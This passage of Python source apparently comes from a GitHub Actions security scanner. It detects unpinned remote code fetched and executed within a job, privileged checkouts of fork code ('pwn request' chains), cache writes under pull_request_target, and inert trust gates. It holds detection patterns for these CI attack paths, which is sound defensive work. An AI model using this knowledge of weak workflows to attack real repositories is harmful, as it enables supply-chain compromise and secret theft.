    if _EXPRESSION_TOKEN_RE.search(written):
        return _opaque_dir(written)
    return _resolve_path(".", written)


def _opaque_dir(written: str) -> str:
    """A directory whose real path the YAML does not contain.

    Keyed by the WRITTEN TEXT, not by the line it appeared on. Keying by line
    made two steps under the same `apps/${{ matrix.app }}` two different
    unknown places, so a fetch in one and an execution in the other — the more
    idiomatic spelling — produced no finding and no gap, while the single-step
    form fired. The same expression is the same directory.
    """
    # Normalized INSIDE the braces too: GitHub ignores the spacing there, so
    # `apps/${{ matrix.app }}` and `apps/${{matrix.app}}` are one directory.
    # Keying on the raw text made them two unknown places and lost the chain
    # between them with no finding and no gap.
    canonical = _EXPRESSION_TOKEN_RE.sub(
        lambda m: "${{ " + " ".join(m.group(0)[3:-2].split()) + " }}", written)
    return _OPAQUE_DIR + " ".join(canonical.split())


_CHECKOUT_USES_RE = re.compile(r"^\s*-?\s*uses\s*:\s*['\"]?actions/checkout[@'\"]")


def _checkout_fetches(
    job: Any, text: str, job_range: tuple[int, int] | None, file_path: Path,
    gap: Callable[[str], None] | None = None,
) -> list[_RemoteFetch]:
    """`actions/checkout` steps that fetch ANOTHER repository at a mutable ref.

    The YAML spelling of the same trust model, and the common one: most
    workflows pull a second repository with `actions/checkout`, not with
    `git clone`. At a branch or tag the tree that lands is whatever the other
    side serves when the job runs, exactly as for the shell arm — and the shell
    arm could not see it, because it reads `run:` scalars only.

    A checkout with no `repository:` is your own code. So is one naming your
    own repository. Both are the overwhelmingly common case and neither is this
    vector.
    """
    steps = job.get("steps") if isinstance(job, dict) else None
    if not isinstance(steps, list):
        return []
    lines = text.splitlines()
    start, end = job_range if job_range else (1, len(lines))
    # Lines from the PARSER, not from a regex counting `uses:` occurrences in
    # order: the words `uses: actions/checkout@v4` inside a heredoc body shifted
    # every later step's line, so the evidence quoted a shell-script line, and a
    # flow-style step matched nothing and fell back to the job header.
    # Only CHECKOUT steps, and their own `uses:` lines. Collecting every step
    # with a `uses:` key while the index below counted only checkouts shifted
    # the mapping by one for every `actions/setup-*` step ahead of the
    # third-party checkout — nearly every real workflow — so the evidence
    # quoted the wrong step and, when the shift moved the checkout EARLIER than
    # a run step, invented a chain whose execution precedes its fetch.
    marks = _step_marks(text) or []
    at_lines = [m.uses_line for m in marks
                if m.uses_line is not None and start <= m.uses_line <= end
                and (m.uses or "").startswith("actions/checkout")]
    out: list[_RemoteFetch] = []
    index = -1
    for step in steps:
        if not isinstance(step, dict):
            continue
        uses = step.get("uses")
        if not (isinstance(uses, str) and uses.startswith("actions/checkout")):
            continue
        index += 1
        # The line this checkout sits on, resolved once so every gap sentence
        # can name it: notes dedupe on their reason text, and two steps with
        # the same unresolvable expression collapsed into one entry.
        mark_line = at_lines[index] if index < len(at_lines) else start
        with_block = step.get("with")
        if not isinstance(with_block, dict):
            continue
        repository = with_block.get("repository")
        if not isinstance(repository, str) or not repository.strip():
            continue                                   # your own code
        # The self-repository test comes FIRST. Running the expression gap
        # ahead of it recorded a checkout of your own repo — the very spelling
        # the clone arm was taught to recognise — as "whether it fetches a
        # third party was NOT established", into the channel that raises the
        # "not a clean result" banner. Two real repositories opened their
        # reports with that warning over nothing but self-checkouts.
        if _is_self_clone(repository, file_path) or \
                _is_self_clone(f"github.com/{repository.strip()}", file_path):
            continue
        if _EXPRESSION_TOKEN_RE.search(repository):
            # Anything else computed at run time — the fork-PR spelling above
            # all — really is unknowable, and the finding would name a third
            # party the scan never established.
            if gap is not None:
                gap(f"an `actions/checkout` on line {mark_line} takes its "
                    f"`repository:` from `{repository.strip()}`, computed at "
                    f"run time, so whether it fetches a third party was NOT "
                    f"established")
            continue
        ref = with_block.get("ref")
        ref = str(ref).strip() if isinstance(ref, (str, int)) else None
        if ref and _FULL_SHA_RE.match(ref):
            if gap is not None:
                gap(f"an `actions/checkout` of `{repository}` on line "
                    f"{mark_line} is pinned to a full commit id, so it is "
                    f"deliberately not reported",
                    kind=_KIND_SUPPRESSED)
            continue                                   # immutable, as pinned
        path = with_block.get("path")
        path = str(path).strip() if isinstance(path, (str, int)) else None
        if path and _EXPRESSION_TOKEN_RE.search(path):
            if gap is not None:
                gap(f"an `actions/checkout` of `{repository}` on line "
                    f"{mark_line} uses a `path:` computed at run time, so what "
                    f"executes out of it was NOT checked")
            continue
        if ref and _EXPRESSION_TOKEN_RE.search(ref):
            # A ref chosen at run time is not knowably mutable OR pinned.
            if gap is not None:
                gap(f"an `actions/checkout` of `{repository}` on line "
                    f"{mark_line} uses a `ref:` computed at run time, so "
                    f"whether it is pinned was NOT established")
            continue
        line = mark_line
        out.append(_RemoteFetch(
            line=line,
            raw=lines[line - 1] if line - 1 < len(lines) else "",
            dest=_resolve_path(".", path) if path else ".",
            ref=ref,
            pos=-1,                       # a YAML step: ordered by line, below
            source=repository.strip(),
        ))
    return out


def _mutable_fetch_executions(
    text: str, job_range: tuple[int, int] | None,
    gap: Callable[[str], None] | None = None,
    file_path: Path | None = None,
    base_cwd: str = ".",
    extra_fetches: list[_RemoteFetch] | None = None,
) -> list[tuple[_RemoteFetch, int, str]]:
    """Every (fetch, execution line, executed path) pair visible in one job.

    Both halves have to be visible in the SAME job — jobs get their own runner
    and their own working tree, so a clone in one is not the tree another runs
    from. Within the job the pairing is positional: the execution must come
    after the fetch that put the code there.

    A pin suppresses a destination only when it lands BETWEEN the fetch and the
    execution. Earlier than the fetch it pinned the tree as it stood rather
    than the code the fetch brought in; later than the execution the code had
    already run unpinned. Both used to suppress.
    """
    fetches: dict[str, _RemoteFetch] = {
        f.dest: f for f in reversed(extra_fetches or [])}
    # Clones a later re-clone into the same destination overwrote (last-wins).
    # They stay as fall-back candidates: the LAST unpinned fetch is the tree
    # that ran only when a command actually ran from it — a trailing re-clone
    # that nothing executes must not bury an earlier clone that WAS executed.
    shadowed: dict[str, list[_RemoteFetch]] = {}
    pending_fetch_head: dict[str, _RemoteFetch] = {}
    # destination -> the EARLIEST position a full-40-hex pin was applied to it.
    # Position matters: pinning is a claim about the code that ran, and a pin
    # applied after an execution pinned nothing that had already executed.
    pinned: dict[str, list[int]] = {}
    # `git remote add <name> <url>` — a third-party fetch spelled in two steps.
    # Without this, two characters of indirection made the whole arm blind.
    named_remotes: dict[str, str] = {}
    # (position, line, resolved path, path as written)
    executions: list[tuple[int, int, str, str]] = []
    # Executions whose path begins with a shell variable this scan cannot
    # resolve. Held aside, not resolved: their real location is unknowable, so
    # pairing one against a fetch would be a guess. Surfaced as a coverage note
    # (below) when the job actually has a fetch to run out of.
    unresolved_execs: list[tuple[int, str]] = []
    # (position, line) for EVERY command in the job. A checkout-step fetch has
    # no position of its own, so its suppression window has to open at the
    # first command after it — any command. Deriving that from `executions`
    # instead opened the window at the first EXECUTION, which is the reported
    # hit itself, leaving an interval nothing could fall inside.
    command_lines: list[tuple[int, int]] = []
    cwd = base_cwd
    skip_step = False
    pos = 0
    step_dirs = _step_working_directories(text)
    for line_no, _raw, command, new_step in _job_shell_commands(
            text, job_range, gap):
        if new_step:
            # `working-directory:` on the step wins over the job's and the
            # workflow's `defaults.run.working-directory`; with none of them
            # set, a step starts at the workspace root. Getting this wrong is
            # not a missed finding but a FALSE one: a clone into `vendor/tools`
            # and a `tools/build.py` that is the repository's own file were
            # reported as a chain between them.
            step_dir = step_dirs.get(line_no)
            skip_step = False
            if step_dir is not None and _EXPRESSION_TOKEN_RE.search(step_dir):
                # `working-directory: apps/${{ matrix.app }}` is extremely
                # common and its value is not knowable here. Skipping the step
                # would lose every chain inside it; pretending to know it would
                # invent chains across it. So it becomes an OPAQUE root, keyed
                # by the expression TEXT: two steps under the same expression
                # are the same place, and two different expressions never are.
                cwd = _opaque_dir(step_dir)
            elif step_dir:
                # A step's `working-directory:` is resolved against the
                # WORKSPACE and REPLACES the job default rather than nesting
                # inside it. Composing them put a step under `app` into
                # `app/app` and lost real chains through the job's own default.
                cwd = _resolve_path(".", step_dir)
            else:
                cwd = base_cwd
        if skip_step:
            continue
        # A substitution is collapsed BEFORE the command is split, because the
        # split breaks on `|` and would otherwise cut `$(ls a | head)` in half
        # and read each piece as a command of its own.
        #
        # But `$( … )` RUNS its body, so the body is then read as commands in
        # its own right, ahead of the command that captures its output.
        # Collapsing alone lost them: `OUT=$(tools/setup.sh)` after a mutable
        # clone produced no finding, no gap and no suppression, while the
        # backtick spelling of the same construct still recorded one.
        bodies = _substitution_command_bodies(command)
        for segment in bodies + _install_command_segments(
                _COMMAND_SUBSTITUTION_RE.sub("$SUBST", command)):
            pos += 1
            if not segment.strip():
                continue
            command_lines.append((pos, line_no))
            tokens = _strip_command_prefix(_shell_tokens(segment))
            if not tokens:
                # `shlex` refused it — an unbalanced quote, most often, and
                # ordinary in real workflows (`awk '{print $1}'` inside a
                # quoted string, and so on). It contributes nothing, which is
                # correct: it is only a COVERAGE GAP when the text it could not
                # read could have held one of the two halves this detector
                # pairs. Reporting every unreadable command instead produced
                # roughly eight notes per repository about `jq` filters.
                if _CHAIN_RELEVANT_RE.search(segment):
                    if gap is not None:
                        gap(f"a command on line {line_no} could not be parsed "
                            f"as shell and mentions a fetch or an execution, "
                            f"so it was NOT checked — review it by hand")
                    if _UNPARSED_CD_RE.search(segment):
                        # A `cd` nobody could read leaves the working directory
                        # stale, so every path resolved after it in this step
                        # would be wrong. That half-read step is abandoned.
                        skip_step = True
                        break
                continue
            if tokens[0] == "cd" and len(tokens) > 1 and not tokens[1].startswith("-"):
                cwd = _resolve_path(cwd, tokens[1])
                continue
            if tokens[0] == "git":
                sub, gdir, args = _git_subcommand(tokens)
                base = _resolve_path(cwd, gdir) if gdir else cwd
                if sub == "remote" and args[:1] == ["add"]:
                    positionals = [a for a in args[1:] if not a.startswith("-")]
                    if (len(positionals) >= 2
                            and _is_remote_url(positionals[1])
                            and not (file_path is not None
                                     and _is_self_clone(positionals[1],
                                                        file_path))):
                        # The two-step spelling of a fetch has to make the same
                        # judgment the one-step spelling makes. Without the
                        # self-clone test the identical URL was silent through
                        # `git clone` and a finding through `git remote add`.
                        named_remotes[positionals[0]] = positionals[1]
                    continue
                if sub == "clone":
                    url, dest_written, ref = _parse_clone(args)
                    if file_path is not None and _is_self_clone(url or "",
                                                                file_path):
                        continue
                    dest_written = _clone_destination(url or "", dest_written)
                    if not dest_written:
                        # Nothing is claimed without a visible destination, but
                        # the job then reads as a job with no fetch in it.
                        if gap is not None:
                            gap(f"a `git clone` on line {line_no} has no "
                                f"visible destination directory, so whether "
                                f"anything executes out of it was NOT checked")
                        continue
                    dest = _resolve_path(base, dest_written)
                    if ref and _FULL_SHA_RE.match(ref):
                        pinned.setdefault(dest, []).append(pos)
                        if gap is not None:
                            gap(f"a clone into `{_as_written(dest)}` on line {line_no} is "
                                f"pinned to a full commit id, so it is "
                                f"deliberately not reported",
                                kind=_KIND_SUPPRESSED)
                        continue
                    # LAST unpinned fetch into a destination wins — it is the
                    # tree that actually ran. `setdefault` kept the FIRST, so a
                    # clone, a pin of it, then a re-clone of the same directory
                    # read as pinned (the pin sat between the stale first clone
                    # and the execution) and the job went silent while it ran
                    # the unpinned re-clone. The `pinned` list still holds every
                    # pin, so a genuine pin of the surviving fetch suppresses.
                    prev = fetches.get(dest)
                    if prev is not None:
                        shadowed.setdefault(dest, []).append(prev)
                    fetches[dest] = _RemoteFetch(line_no, _raw, dest, ref, pos)
                    continue
                if sub == "fetch":
                    positionals = [a for a in args if not a.startswith("-")]
                    if not positionals:
                        continue
                    if not (_is_remote_url(positionals[0])
                            or positionals[0] in named_remotes):
                        continue
                    ref = positionals[1] if len(positionals) > 1 else None
                    if ref and _FULL_SHA_RE.match(ref):
                        pinned.setdefault(base, []).append(pos)
                        continue
                    # A fetch alone changes no file in the tree — it becomes
                    # executable code only once something checks FETCH_HEAD
                    # out, so it is held until that happens.
                    pending_fetch_head.setdefault(
                        base, _RemoteFetch(line_no, _raw, base, ref, pos))
                    continue
                if sub in ("checkout", "reset", "switch", "merge", "rebase"):
                    if any(_FULL_SHA_RE.match(a) for a in args):
                        pinned.setdefault(base, []).append(pos)
                    if any("FETCH_HEAD" in a for a in args):
                        held = pending_fetch_head.get(base)
                        if held is not None:
                            fetches.setdefault(base, held)
                    continue
                continue
            path = _executed_path(tokens)
            if path:
                if _leading_unresolved_var(path):
                    unresolved_execs.append((line_no, path))
                    continue
                executions.append((pos, line_no, _resolve_path(cwd, path), path))

    # A path led by an unresolvable shell variable is a coverage gap ONLY where
    # there is a fetched tree it might have run out of — otherwise every
    # `$CARGO_HOME/bin/tool` in an ordinary job would raise a note about a chain
    # that cannot exist. Whether the fetch is visible is known only now the
    # whole job has been read.
    if fetches and gap is not None:
        for line_no, path in unresolved_execs:
            gap(f"an execution on line {line_no} runs a path beginning with a "
                f"shell variable (`{_as_written(path)}`) whose value is not "
                f"visible in this YAML, so whether it runs out of a fetched "
                f"tree was NOT checked — review it by hand")

    pairs: list[tuple[_RemoteFetch, int, str]] = []
    for dest, fetch in fetches.items():
        # The last unpinned fetch into a destination is the tree that ran — but
        # only when a command actually ran from it. A trailing re-clone nothing
        # executes leaves the last fetch with no hit; the earlier clone a
        # command DID run from is still live, so the shadowed fetches stay as
        # fall-back candidates, tried latest-first. A candidate that is
        # pin-suppressed also falls through: an earlier, unpinned tree may have
        # been executed before the pin landed.
        candidates = [fetch, *reversed(shadowed.get(dest, ()))]
        fired: tuple[_RemoteFetch, int, str] | None = None
        suppressed_line: int | None = None
        for cand in candidates:
            hit = next(
                (
                    (at, line, written)
                    for at, line, resolved, written in executions
                    # A shell fetch is ordered by position in the command stream
                    # (both halves can share a line); a checkout step has no
                    # position there, so it is ordered by line.
                    if (line > cand.line if cand.pos < 0 else at > cand.pos)
                    and _under(dest, resolved)
                ),
                None,
            )
            if hit is None:
                continue
            # ANY pin between the fetch and the execution suppresses — not just
            # the first one seen. Keeping only the earliest hid the pin a
            # repository actually applied when an older one landed on a tree it
            # then discarded, and told it that it executes unpinned remote code.
            #
            # A checkout-step fetch has no position in the command stream, so
            # its window opens just before the first shell command AFTER its
            # step — ANY command. Two ways to get this wrong, and this code has
            # had both: opening at -1 let every pin in the job count, including
            # one applied to a tree the checkout then replaced; opening at the
            # first EXECUTION-shaped command left the window empty whenever that
            # execution was the reported hit, so the fix recipe's own shape
            # (checkout, pin, run) could never suppress and an unrelated command
            # sitting in between decided the verdict.
            window_start = cand.pos
            if window_start < 0:
                window_start = next(
                    (at for at, line in command_lines if line > cand.line),
                    hit[0] + 1) - 1
            pin_at = next((p for p in pinned.get(dest, ())
                           if window_start < p < hit[0]), None)
            if pin_at is not None:
                suppressed_line = cand.line
                continue
            fired = (cand, hit[1], hit[2])
            break
        if fired is not None:
            pairs.append(fired)
        elif suppressed_line is not None and gap is not None:
            # Pinned before it ran: the fix this entry recommends, applied.
            gap(f"a fetch into `{_as_written(dest)}` on line {suppressed_line} was pinned to "
                f"a full commit id before anything ran from it, so it is "
                f"deliberately not reported",
                kind=_KIND_SUPPRESSED)
    return sorted(pairs, key=lambda p: p[0].line)


def _correlation_unverified_remote_code_execution(
    file_path: Path,
) -> Iterator[RawHit]:
    """P14.24 — the job executes remote code nobody pinned.

    Two arms, one vector (see the comment block above): the piped installer,
    delegated unchanged to the shared `run:`-scalar walker, and a git fetch at
    a MUTABLE ref whose tree the same job then executes from.
    """
    yield from detect_yaml_run_injection(file_path, _REMOTE_PIPE_TO_SHELL)

    text = _read_text_safe(file_path)
    if not text:
        return
    doc = _parse_yaml_text(text, file_path)
    if not isinstance(doc, dict):
        return
    ranges = {name: (s, e) for name, s, e in (job_line_ranges(file_path) or [])}
    for job_name, _job in _walk_jobs(doc):
        job_range = ranges.get(job_name)
        if job_range is None:
            # No source range for this job means its commands cannot be
            # scoped to it, and a cross-job pairing would be a false claim.
            # Recorded as a coverage gap rather than dropped in silence.
            _DROPPED_MATCHES.append({
                "kind": _KIND_UNANCHORED,
                "file": str(file_path),
                "reason": (
                    f"P14.24: jobs.{job_name} could not be located in the raw "
                    f"file, so its shell was NOT scanned for a mutable fetch "
                    f"executed out of — review the job manually"
                ),
            })
            continue
        def _gap(reason: str, _job: str = job_name,
                 kind: str = _KIND_NOT_SCANNED) -> None:
            _DROPPED_MATCHES.append({
                "file": str(file_path),
                "reason": f"P14.24: jobs.{_job}: {reason}",
                "kind": kind,
            })

        for fetch, exec_line, exec_path in _mutable_fetch_executions(
            text, job_range, _gap, file_path,
            _default_working_directory(doc, _job),
            _checkout_fetches(_job, text, job_range, file_path, _gap),
        ):
            yield RawHit(
                line=fetch.line,
                evidence=f"{fetch.line:>4}: {fetch.raw}  <-- here",
                # Identifies the FETCH, not the line. Deduplication keys on
                # this, so using the whole line made two clones written on one
                # line byte-identical and the second chain vanished with no
                # record anywhere.
                match_text=(f"fetch into {_as_written(fetch.dest)} at "
                            f"{fetch.ref or 'HEAD'}"),
                derived_note=(
                    (f"jobs.{job_name} checks out `{fetch.source}` at "
                     if fetch.source else
                     f"jobs.{job_name} fetches remote code at ")
                    + f"{_ref_description(fetch.ref)} into "
                      f"`{_as_written(fetch.dest)}` — a "
                    f"MUTABLE reference, so what lands in the tree is whatever "
                    f"the other side serves at the moment the job runs — and "
                    f"then executes `{_as_written(exec_path)}` from it at "
                    f"line {exec_line}. "
                    f"A full 40-character commit id is the only reference that "
                    f"cannot change under you."
                ),
            )


def _correlation_untrusted_trigger_writes_cache(
    file_path: Path,
) -> Iterator[RawHit]:
    """P14.7 — workflow has `pull_request_target` trigger AND any job writes
    the shared cache."""
    text = _read_text_safe(file_path)
    if not text:
        return
    doc = _parse_yaml_text(text, file_path)
    if not isinstance(doc, dict):
        return
    on_node = _get_on_node(doc)
    triggers = _on_trigger_names(on_node) if on_node is not None else []
    if "pull_request_target" not in triggers:
        return
    for job_name, job in _walk_jobs(doc):
        if _job_uses_cache(job):
            line = _job_line_in_text(text, job_name)
            yield RawHit(
                line=line,
                evidence=(
                    f"{line:>4}: workflow runs on `pull_request_target` AND "
                    f"jobs.{job_name} writes the shared cache <-- here"
                    + _gate_note(job, triggers)
                ),
                match_text=job_name,
                derived=True,
            )


# Which top-level `github.event.*` objects each trigger's payload populates.
# Deliberately partial in BOTH directions: a trigger absent from this table
# makes the whole verdict unknowable (see `_inert_gate_objects`), and an object
# absent from `_GATE_CHECKED_OBJECTS` is never judged at all. Both omissions
# fail toward silence, which is the only safe direction for a check whose
# false-positive would read "your security gate does nothing".
_TRIGGER_EVENT_OBJECTS: dict[str, frozenset[str]] = {
    "issues": frozenset({"issue", "label"}),
    "issue_comment": frozenset({"issue", "comment"}),
    "pull_request": frozenset({"pull_request", "label"}),
    "pull_request_target": frozenset({"pull_request", "label"}),
    "pull_request_review": frozenset({"pull_request", "review"}),
    "pull_request_review_comment": frozenset({"pull_request", "comment"}),
    "push": frozenset({"head_commit", "commits", "pusher"}),
    "discussion": frozenset({"discussion"}),
    "discussion_comment": frozenset({"discussion", "comment"}),
    "workflow_run": frozenset({"workflow_run", "workflow"}),
    "workflow_dispatch": frozenset({"inputs"}),
    "repository_dispatch": frozenset({"client_payload"}),
    "release": frozenset({"release"}),
    "fork": frozenset({"forkee"}),
    "label": frozenset({"label"}),
    "milestone": frozenset({"milestone"}),
    # `deployment` and `deployment_status` carry a top-level `workflow_run`
    # (and `workflow`, `check_run`) whenever the deployment came from a
    # workflow — the normal case, and exactly what such a job gates on.
    "deployment": frozenset({"deployment", "workflow", "workflow_run"}),
    "deployment_status": frozenset({
        "deployment", "deployment_status", "workflow", "workflow_run",
        "check_run",
    }),
    "check_run": frozenset({"check_run"}),
    "check_suite": frozenset({"check_suite"}),
    "registry_package": frozenset({"registry_package"}),
    "schedule": frozenset(),
}

# The objects a gate is actually judged on. Restricted to the ones that carry a
# real trust decision and whose payload membership is unambiguous.
_GATE_CHECKED_OBJECTS = frozenset({
    "pull_request", "issue", "comment", "discussion", "workflow_run",
    "head_commit", "release", "client_payload", "review", "forkee",
})

_GATE_EVENT_REF_RE = re.compile(r"github\.event\.([a-zA-Z_][a-zA-Z_0-9]*)")

# A whole `if:` that is nothing but one comparison of a `github.event.*` path
# against a quoted literal. Anything else — a second term, a negation, a
# function call, a comparison to another expression — is left undecided.
# JSON's number grammar, which is what GitHub uses to decide whether a string
# becomes a number or NaN. Deliberately stricter than `float()`: no leading
# `+`, no surrounding space, no `inf`/`nan`, no underscores, no hex.
_JSON_NUMBER_RE = re.compile(r"-?(?:0|[1-9][0-9]*)(?:\.[0-9]+)?(?:[eE][+-]?[0-9]+)?")

_GATE_LONE_COMPARISON_RE = re.compile(
    r"^\s*(?:\$\{\{\s*)?"
    r"github\.event\.(?P<obj>[a-zA-Z_][a-zA-Z_0-9]*)"
    r"(?:\.[a-zA-Z_][a-zA-Z_0-9]*)*"
    r"\s*(?P<op>==|!=)\s*"
    r"(?P<lit>'[^']*'|\"[^\"]*\")"
    r"\s*(?:\}\}\s*)?$"
)


_QUOTED_SPAN_RE = re.compile(r"'[^']*'|\"[^\"]*\"")


def _strip_quoted(condition: str) -> str:
    """`condition` with string literals blanked out.

    A gate reading `github.event.pull_request.user.login != 'filed by
    github.event.discussion bot'` does not read `github.event.discussion` —
    that text is data. Counting it made a live gate report a dead field.
    """
    return _QUOTED_SPAN_RE.sub(lambda m: " " * len(m.group(0)), condition)


def _inert_gate_objects(condition: str, triggers: list[str]) -> list[str]:
    """`github.event.*` objects this gate reads that NO declared trigger fills.

    snowflakedb/snowflake-connector-net's `jira_issue.yml` (Wiz, Jun 2026)
    gated on `github.event.pull_request.user.login != '...'` while triggering
    on `issues` and `issue_comment`. Neither payload has a `pull_request`, so
    the comparison was `null != '...'` — always true. The gate looked like it
    restricted the job to one bot account; it admitted every GitHub user, and
    the job interpolated the issue title into a shell step holding a Jira API
    token.

    The rule is "no DECLARED trigger populates it", not "this trigger doesn't":
    a workflow on both `issues` and `pull_request_target` reading
    `github.event.pull_request` has a gate that is live half the time, which is
    an ordinary bypass question and not this check's business.

    Returns [] — no verdict — whenever any declared trigger is missing from
    `_TRIGGER_EVENT_OBJECTS`. `workflow_call` is the load-bearing case: a
    reusable workflow runs on the CALLER's payload, which this file cannot see,
    so its event objects are unknowable rather than absent.
    """
    if not triggers:
        return []
    populated: set[str] = set()
    for trigger in triggers:
        if trigger not in _TRIGGER_EVENT_OBJECTS:
            return []
        populated |= _TRIGGER_EVENT_OBJECTS[trigger]
    referenced = {
        m.group(1)
        for m in _GATE_EVENT_REF_RE.finditer(_strip_quoted(condition))
    }
    return sorted(
        (referenced & _GATE_CHECKED_OBJECTS) - populated
    )


def _dead_comparison_verdict(condition: str, dead: list[str]) -> str:
    """`"open"`, `"closed"`, or `""` for a gate built from one dead comparison.

    Knowing that a term always compares against an empty value does NOT say
    which way the gate falls. `null != 'bot'` is always true and admits
    everyone — Snowflake's bug. `null == 'bot'` is always false and admits
    nobody: still a broken gate, but describing it as "does not restrict who
    reaches this job" tells the reader the exact opposite of what it does.
    And a dead term inside `a && b` decides nothing at all, because the live
    conjunct still restricts.

    So a verdict is only offered when the ENTIRE condition is that one
    comparison, and the operator settles the direction. Everything else falls
    through to the neutral wording, which states the lookup fact and stops.
    """
    match = _GATE_LONE_COMPARISON_RE.match(condition)
    if match is None or match.group("obj") not in dead:
        return ""
    literal = match.group("lit")[1:-1]
    # GitHub casts both sides to a number when the types differ, and an absent
    # value casts to 0. So it compares EQUAL to `''`, to `'0'`, to `'0.0'` —
    # any literal worth zero inverts the whole operator table. Decline those.
    #
    # The parser has to be GitHub's, not Python's: a string becomes a number
    # only "from any legal JSON number format, otherwise NaN". `'+0'` and
    # `' 0 '` are NOT legal JSON, so GitHub reads NaN and the comparison is
    # not equal to an absent value — a verdict is available. `float()` accepts
    # both and would have thrown those verdicts away.
    if not literal:
        return ""
    if _JSON_NUMBER_RE.fullmatch(literal) and float(literal) == 0:
        return ""
    return "open" if match.group("op") == "!=" else "closed"


def _gate_note(
    job: Any,
    triggers: list[str],
    dead_field_only: bool = False,
) -> str:
    """A sentence naming this job's own `if:` condition, or "".

    cal.com's `pr.yml` gates its cache-writing job behind
    `needs.trust-check.outputs.is-trusted == 'true'`, and the report still read
    "a fork PR plants malware" with no mention of it. The gate is NOT a
    suppression — trust gates are routinely bypassable, and deciding that here
    would be guessing — but a reader who cannot see it cannot triage the
    finding.

    The one case we DO decide is a gate whose whole condition is a comparison
    against an event object no declared trigger populates
    (`_inert_gate_objects` + `_dead_comparison_verdict`). "Verify it" is the
    wrong instruction there — there is nothing to verify — and the reader most
    likely to miss it is the one who does not know which payload carries which
    object. That is a lookup, not a judgement call.

    The lookup alone is not the verdict, though. It says the comparison runs
    against an empty value; the operator says whether that admits everyone or
    nobody, and a second conjunct can make it moot either way. When the shape
    does not settle that, the note reports the dead term as a fact and keeps
    the ordinary "verify it" rather than guessing a direction.

    `dead_field_only` drops the generic "verify it" half and returns "" unless
    there is a dead field to report. P14.10 asks for that: an injection is
    worth fixing whether or not its gate holds, so telling an injection's
    reader the finding "stands only if that gate can be bypassed" would
    contradict the catalog entry the finding cites.
    """
    if not isinstance(job, dict):
        return ""
    condition = job.get("if")
    if condition is None or isinstance(condition, (dict, list)):
        return ""
    text = " ".join(str(condition).split())
    if not text:
        return ""
    dead = _inert_gate_objects(text, triggers)
    if dead:
        names = ", ".join(f"`github.event.{obj}`" for obj in dead)
        trigger_list = ", ".join(f"`{t}`" for t in sorted(set(triggers)))
        plural = len(dead) > 1
        lookup = (
            f"\n      this job carries a gate condition: {text} — it reads "
            f"{names}, which no trigger this workflow declares "
            f"({trigger_list}) ever populates, so "
            + ("those comparisons are" if plural else "that comparison is")
            + " against an empty value"
        )
        verdict = _dead_comparison_verdict(text, dead)
        if verdict == "open":
            return (
                f"{lookup} and " + ("are" if plural else "is")
            + " always true: the gate is INERT — it does "
                f"not restrict who reaches this job"
            )
        if verdict == "closed":
            return (
                f"{lookup} and " + ("are" if plural else "is")
            + " always false: the gate is INERT as a trust "
                f"control — rather than restricting who reaches this job it "
                f"blocks every run of it, so this job never runs under any "
                f"trigger the workflow declares"
            )
        # NOT "cannot restrict anything". A dead comparison is a CONSTANT, and
        # a constant is the opposite of harmless once other terms are in play:
        # `A && (null == 'x')` is always false, so the dead term closes the
        # whole gate by itself, and `A || (null != 'x')` is always true, so it
        # opens the gate whatever `A` says. Nothing here evaluates a compound
        # condition, so the honest statement is that the term is fixed and the
        # gate's overall behaviour is unexamined — never that the term is inert
        # on its own.
        return (
            f"{lookup} and therefore always "
            + ("evaluate" if plural else "evaluates")
            + " the same way, whoever triggered the workflow. What "
            f"the gate as a whole then does — including whether a fixed term "
            f"decides it outright — depends on the rest of the condition, "
            f"which is not evaluated here — verify it"
        )
    if dead_field_only:
        return ""
    return (
        f"\n      this job carries a gate condition: {text} — the finding "
        f"stands only if that gate can be bypassed; verify it"
    )


def _attacker_head_ref(value: Any) -> bool:
    """True if a checkout `ref:`/`repository:` value resolves to attacker-
    controlled head code under an untrusted-event trigger."""
    if not isinstance(value, str):
        return False
    needles = (
        "github.event.pull_request.head",   # .sha / .ref / .repo.full_name
        "github.head_ref",
        "github.event.workflow_run.head",   # _sha / _branch / _commit
        "refs/pull/",                       # refs/pull/N/merge|head — the PR's
                                            # content either way
    )
    return any(n in value for n in needles)


def _job_checkout_head_then_executes(job: dict[str, Any]) -> tuple[int, str] | None:
    """The load-bearing predicate of P14.9: within ONE job, an
    `actions/checkout` of the attacker's head ref FOLLOWED by a step that
    executes from the working tree (`run:` or a local `./action`).

    The execution leg is a deliberate, documented over-approximation: a
    post-checkout `run:` step almost always executes tree-controlled content
    (install scripts, Makefiles, test suites), so we do not try to prove which
    file it touches. A checkout with no `ref:` (base/merge ref) never
    qualifies. Returns (checkout_step_index, ref_text) or None.
    """
    steps = job.get("steps")
    if not isinstance(steps, list):
        return None
    checkout_idx: int | None = None
    ref_text = ""
    for i, step in enumerate(steps):
        if not isinstance(step, dict):
            continue
        uses = step.get("uses")
        if isinstance(uses, str) and uses.startswith("actions/checkout"):
            with_block = step.get("with")
            if isinstance(with_block, dict):
                for key in ("ref", "repository"):
                    if _attacker_head_ref(with_block.get(key)):
                        checkout_idx = i
                        ref_text = str(with_block.get(key))
                        break
        if checkout_idx is not None and i > checkout_idx:
            executes = "run" in step or (
                isinstance(step.get("uses"), str)
                and step["uses"].startswith("./")
            )
            if executes:
                return checkout_idx, ref_text
    return None


def _correlation_untrusted_checkout_executes(file_path: Path) -> Iterator[RawHit]:
    """P14.9 — fork code executed with privileges (the "pwn request" chain).

    Three conditions in ONE job: (1) the workflow runs on an untrusted-event
    trigger that carries the BASE repo's context (write token, secrets);
    (2) `actions/checkout` pulls the attacker's head code (`ref:` /
    `repository:` naming pull_request.head.*, github.head_ref, or
    workflow_run.head_*); (3) a later step in the same job executes from the
    working tree. One hit per qualifying job. The bare trigger without the
    head checkout is NOT a finding here — that presence fact belongs to the
    scored config checks.
    """
    text = _read_text_safe(file_path)
    if not text:
        return
    doc = _parse_yaml_text(text, file_path)
    if not isinstance(doc, dict):
        return
    on_node = _get_on_node(doc)
    triggers = set(_on_trigger_names(on_node)) if on_node is not None else set()
    if not triggers & _UNTRUSTED_TRIGGERS:
        return
    trig = sorted(triggers & _UNTRUSTED_TRIGGERS)[0]
    for job_name, job in _walk_jobs(doc):
        hit = _job_checkout_head_then_executes(job)
        if hit is None:
            continue
        _, ref_text = hit
        line = _job_line_in_text(text, job_name)
        yield RawHit(
            line=line,
            evidence=(
                f"{line:>4}: job `{job_name}` on `{trig}` checks out "
                f"`{ref_text}` then executes from the tree <-- here"
                + _gate_note(job, sorted(triggers))
            ),
            match_text=job_name,
            derived=True,
        )


_UNTRUSTED_TRIGGERS = frozenset(
    {
        "pull_request_target",
        "issue_comment",
        "workflow_run",
